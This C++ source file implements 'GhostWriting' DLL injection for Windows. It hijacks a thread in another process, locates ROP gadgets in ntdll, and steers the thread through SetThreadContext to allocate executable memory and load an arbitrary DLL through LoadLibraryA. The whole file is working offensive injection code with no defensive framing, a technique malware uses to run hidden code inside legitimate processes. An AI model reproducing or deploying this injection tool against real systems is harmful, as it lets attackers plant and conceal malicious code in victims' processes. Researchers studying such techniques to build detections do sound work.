#include <iostream>
#include "GhostWritingInjection.h"
#include "ThreadContext.h"
#include "../Common/Utils.h"
#include "../Common/Process.h"

namespace
{
    bool is32BitsThread(HANDLE threadHandle)
    {
        DWORD pid = GetProcessIdOfThread(threadHandle);
        HANDLE procHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION , false, pid);
        BOOL isWow64 = false;
        if (!IsWow64Process(procHandle, &isWow64))
        {
            std::cerr << "IsWow64Process error " << GetLastError() << std::endl;
        }
        CloseHandle(procHandle);
        return isWow64;
    }
}

GhostWriter::GhostWriter(DWORD threadID)
{
    this->threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadID);
    if (!this->threadHandle)
    {
        ThrowException(std::string("GhostWriter: OpenThread error ") + std::to_string(GetLastError()));
    }
    this->is32Bits = is32BitsThread(this->threadHandle);
}

HANDLE GhostWriter::GetThreadHandle()
{
    return this->threadHandle;
}

bool GhostWriter::SuspendThread()
{
    if (::SuspendThread(this->threadHandle) != (DWORD)-1)
    {
        return true;
    }
    std::cerr << "SuspendThread error " << GetLastError() << "\n";
    return false;
}

bool GhostWriter::ResumeThread()
{
    if (::ResumeThread(this->threadHandle) != (DWORD)-1)
    {
        return true;
    }
    std::cerr << "ResumeThread error " << GetLastError() << "\n";
    return false;
}

void GhostWriter::GetContext(void* context)
{
    bool success = false;
    this->SuspendThread();
    if (this->is32Bits)
    {
        PWOW64_CONTEXT contextPtr = reinterpret_cast<PWOW64_CONTEXT>(context);
        contextPtr->ContextFlags = CONTEXT_ALL;
        success = Wow64GetThreadContext(this->threadHandle, reinterpret_cast<PWOW64_CONTEXT>(contextPtr));
    }
    else
    {
        LPCONTEXT contextPtr = reinterpret_cast<LPCONTEXT>(context);
        contextPtr->ContextFlags = CONTEXT_ALL;
        success = GetThreadContext(this->threadHandle, reinterpret_cast<LPCONTEXT>(contextPtr));
    }

    if (!success)
    {
        std::cerr << "GetThreadContext error " << GetLastError() << "\n";
    }
    this->ResumeThread();
}

void GhostWriter::SetContext(void* context)
{
    bool success = false;
    this->SuspendThread();
    if (this->is32Bits)
    {
        success = Wow64SetThreadContext(this->threadHandle, reinterpret_cast<PWOW64_CONTEXT>(context));
    }
    else
    {
        success = SetThreadContext(this->threadHandle, reinterpret_cast<LPCONTEXT>(context));
    }

    if (!success)
    {
        std::cerr << "SetThreadContext error " << GetLastError() << "\n";
    }
    this->ResumeThread();
}

void GhostWriter::WriteBytes(BYTE* buffer, size_t bufferSize, uintptr_t where)
{
    unsigned int ptrSize = this->is32Bits ? 4 : 8;
    size_t newSize = bufferSize + ptrSize; // extra space for null bytes
    auto newBuffer = std::make_unique<BYTE[]>(newSize);
    memset(newBuffer.get(), 0, newSize);
    memcpy(newBuffer.get(), buffer, bufferSize);

    for (unsigned int i = 0; i < bufferSize; i += ptrSize)
    {
        uintptr_t what = *reinterpret_cast<uintptr_t*>(buffer + i);
        this->CallWriteGadget(what, where + i);
        this->WaitForLoop();
    }
}

void GhostWriter::CallFunctionAt(BYTE* address)
{
    if (this->loopGadgetPtrAddr)
    {
        ThreadContext context = ThreadContext(this->is32Bits);

        this->SuspendThread();
        this->GetContext(context.GetContextPtr());
        context.SetRsp(reinterpret_cast<uintptr_t>(this->loopGadgetPtrAddr));
        context.SetRip(reinterpret_cast<uintptr_t>(address));
        this->SetContext(context.GetContextPtr());
        this->ResumeThread();
    }
    else
    {
        std::cerr << "Loop gadget pointer address is null! Call push gadget or set it first." << std::endl;
    }
}

void GhostWriter::WaitForLoop()
{
    ThreadContext context = ThreadContext(this->is32Bits);

    while (true)
    {
        this->SuspendThread();
        this->GetContext(context.GetContextPtr());
        this->ResumeThread();
        uintptr_t curr = context.GetRip();
        if (reinterpret_cast<uintptr_t>(this->loopGadgetAddr) == curr)
        {
            return;
        }
        Sleep(100);
    }
}

void GhostWriter::CallPushGadget()
{
    ThreadContext context = ThreadContext(this->is32Bits);
    unsigned int ptrSize = this->is32Bits ? 4 : 8;

    this->SuspendThread();
    this->GetContext(context.GetContextPtr());
    this->loopGadgetPtrAddr = reinterpret_cast<BYTE*>(context.GetRsp() - ptrSize);
    context.SetRdi(reinterpret_cast<uintptr_t>(this->loopGadgetAddr));
    context.SetRip(reinterpret_cast<uintptr_t>(this->pushGadgetAddr));
    this->SetContext(context.GetContextPtr());
    this->ResumeThread();
}

void GhostWriter::CallWriteGadget(uintptr_t what, uintptr_t where)
{
    if (this->loopGadgetPtrAddr)
    {
        ThreadContext context = ThreadContext(this->is32Bits);

        this->SuspendThread();
        this->GetContext(context.GetContextPtr());
        context.SetRdx(what);
        context.SetRcx(where);
        context.SetRsp(reinterpret_cast<uintptr_t>(this->loopGadgetPtrAddr));
        context.SetRip(reinterpret_cast<uintptr_t>(this->writeGadgetAddr));
        this->SetContext(context.GetContextPtr());
        this->ResumeThread();
    }
    else
    {
        std::cerr << "Loop gadget pointer address is null! Call push gadget or set it first." << std::endl;
    }
}

// ***********************************

namespace
{
    uintptr_t CallVirtualAlloc(GhostWriter& ghostWriter, uintptr_t virtualAllocAddr)
    {
        ThreadContext context = ThreadContext(ghostWriter.is32Bits);
        
        if (ghostWriter.is32Bits)
        {
            ghostWriter.CallWriteGadget(0, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 4)); // nullptr
            ghostWriter.WaitForLoop();
            ghostWriter.CallWriteGadget(0x1000, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 8)); // size
            ghostWriter.WaitForLoop();
            ghostWriter.CallWriteGadget(0x3000, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 12)); // MEM_COMMIT | MEM_RESERVE
            ghostWriter.WaitForLoop();
            ghostWriter.CallWriteGadget(0x40, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 16)); // PAGE_EXECUTE_READWRITE
            ghostWriter.WaitForLoop();
        }
        else
        {
            ghostWriter.GetContext(context.GetContextPtr());
            context.SetRcx(0); // nullptr
            context.SetRdx(0x1000); // size
            context.SetR8(0x3000); // MEM_COMMIT | MEM_RESERVE
            context.SetR9(0x40); // PAGE_EXECUTE_READWRITE
            ghostWriter.SetContext(context.GetContextPtr());
        }
        // call function
        ghostWriter.CallFunctionAt(reinterpret_cast<BYTE*>(virtualAllocAddr));
        ghostWriter.WaitForLoop();

        // get allocated memory address
        ghostWriter.GetContext(context.GetContextPtr());
        return context.GetRax();
    }

    void CallLoadLibraryA(GhostWriter& ghostWriter, uintptr_t loadLibraryAAddr, uintptr_t dllPathAddr)
    {
        ThreadContext context = ThreadContext(ghostWriter.is32Bits);

        if (ghostWriter.is32Bits)
        {
            // set dllPath argument
            ghostWriter.CallWriteGadget(dllPathAddr, reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetPtrAddr + 4));
            ghostWriter.WaitForLoop();
        }
        else
        {
            // set dllPath argument
            ghostWriter.GetContext(context.GetContextPtr());
            context.SetRcx(dllPathAddr);
            ghostWriter.SetContext(context.GetContextPtr());
        }
        // call function
        ghostWriter.CallFunctionAt(reinterpret_cast<BYTE*>(loadLibraryAAddr));
        ghostWriter.WaitForLoop();
    }

    BYTE* FindLoopGadget(Process& proc)
    {
        MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
        PE peNtdll = PE(meNtdll.szExePath);

        BYTE* loopGadgetPtr = peNtdll.ScanSections((BYTE*)"\xEB\xFE", "..", true);
        if (!loopGadgetPtr)
        {
            std::cerr << "Could not find loop gadget\n";
            return 0;
        }
        return meNtdll.modBaseAddr + peNtdll.BufferToRVA(loopGadgetPtr);
    }

    // push rdi; ret;
    BYTE* FindPushGadget(Process& proc)
    {
        MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
        PE peNtdll = PE(meNtdll.szExePath);

        BYTE* pushGadgetPtr = peNtdll.ScanSections((BYTE*)"\x57\xC3", "..", true);
        if (!pushGadgetPtr)
        {
            std::cerr << "Could not find push gadget\n";
            return 0;
        }
        return meNtdll.modBaseAddr + peNtdll.BufferToRVA(pushGadgetPtr);
    }

    // mov qword ptr [rcx], rdx; ret;
    BYTE* FindWriteGadget(Process& proc)
    {
        MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
        PE peNtdll = PE(meNtdll.szExePath);

        BYTE* writeGadgetPtr = nullptr;
        if (proc.is32Bits)
        {
            writeGadgetPtr = peNtdll.ScanSections((BYTE*)"\x89\x11\xC3", "...", true);
        }
        else
        {
            writeGadgetPtr = peNtdll.ScanSections((BYTE*)"\x48\x89\x11\xC3", "....", true);
        }

        if (!writeGadgetPtr)
        {
            std::cerr << "Could not find write gadget\n";
            return 0;
        }
        return meNtdll.modBaseAddr + peNtdll.BufferToRVA(writeGadgetPtr);
    }
}

// TODO: restore original context
bool GhostWritingInjection(DWORD threadID, PE& dll)
{
    bool success = false;
    GhostWriter ghostWriter = GhostWriter(threadID);
    Process proc = Process(GetProcessIdOfThread(ghostWriter.GetThreadHandle()));

    if (proc.Open(PROCESS_QUERY_LIMITED_INFORMATION))
    {
        ThreadContext originalContext = ThreadContext(proc.is32Bits);
        ThreadContext context = ThreadContext(ghostWriter.is32Bits);
        unsigned int ptrSize = ghostWriter.is32Bits ? 4 : 8;

        // get function addresses
        MODULEENTRY32 meKernel32 = proc.GetModule("kernel32.dll");
        PE peKernel32 = PE(meKernel32.szExePath);
        uintptr_t loadLibraryAAddr = reinterpret_cast<uintptr_t>(meKernel32.modBaseAddr) + peKernel32.GetExportRVA("LoadLibraryA");
        uintptr_t virtualAllocAddr = reinterpret_cast<uintptr_t>(meKernel32.modBaseAddr) + peKernel32.GetExportRVA("VirtualAlloc");
        std::cout << "LoadLibraryA at 0x" << loadLibraryAAddr << "\n";
        std::cout << "VirtualAlloc at 0x" << virtualAllocAddr << "\n\n";

        // find gadgets
        BYTE* loopGadgetAddr = FindLoopGadget(proc);
        BYTE* pushGadgetAddr = FindPushGadget(proc);
        BYTE* writeGadgetAddr = FindWriteGadget(proc);

        std::cout << std::hex;
        std::cout << "Loop gadget address: 0x" << (uintptr_t)loopGadgetAddr << "\n";
        std::cout << "Push gadget address: 0x" << (uintptr_t)pushGadgetAddr << "\n";
        std::cout << "Write gadget address: 0x" << (uintptr_t)writeGadgetAddr << "\n\n";

        ghostWriter.loopGadgetAddr = loopGadgetAddr;
        ghostWriter.pushGadgetAddr = pushGadgetAddr;
        ghostWriter.writeGadgetAddr = writeGadgetAddr;

        std::cout << "Calling push gadget...\n";
        ghostWriter.CallPushGadget();
        std::cout << "Waiting for loop...\n";
        ghostWriter.WaitForLoop();
        std::cout << "Thread is looping!\n\n";

        // rebase stack so we don't overwrite the original stack. -----
        std::cout << "Rebasing stack...\n";
        ghostWriter.GetContext(context.GetContextPtr());
        uintptr_t baseStackAddress = context.GetRsp() - 0x100;

        // set new loopGadgetPtrAddr
        ghostWriter.CallWriteGadget(reinterpret_cast<uintptr_t>(ghostWriter.loopGadgetAddr), baseStackAddress);
        ghostWriter.WaitForLoop();
        ghostWriter.loopGadgetPtrAddr = reinterpret_cast<BYTE*>(baseStackAddress);
        std::cout << "Stack rebased!\n\n";

        // inject dll -----
        std::cout << "Calling VirtualAlloc...\n";
        uintptr_t memoryPageAddr = CallVirtualAlloc(ghostWriter, virtualAllocAddr);
        std::cout << "Memory page at 0x" << memoryPageAddr << std::endl;

        // write dll path
        std::cout << "Writing dll path in the newly allocated memory...\n";
        ghostWriter.WriteBytes(reinterpret_cast<BYTE*>(dll.filePath), strnlen(dll.filePath, MAX_PATH) + 1, memoryPageAddr);
        ghostWriter.WaitForLoop();

        std::cout << "Calling LoadLibraryA...\n";
        CallLoadLibraryA(ghostWriter, loadLibraryAAddr, memoryPageAddr);
        std::cout << "Done!" << std::endl;

        proc.Close();
    }
    else
    {
        std::cerr << "Could not open process\n";
    }
    return success;
}
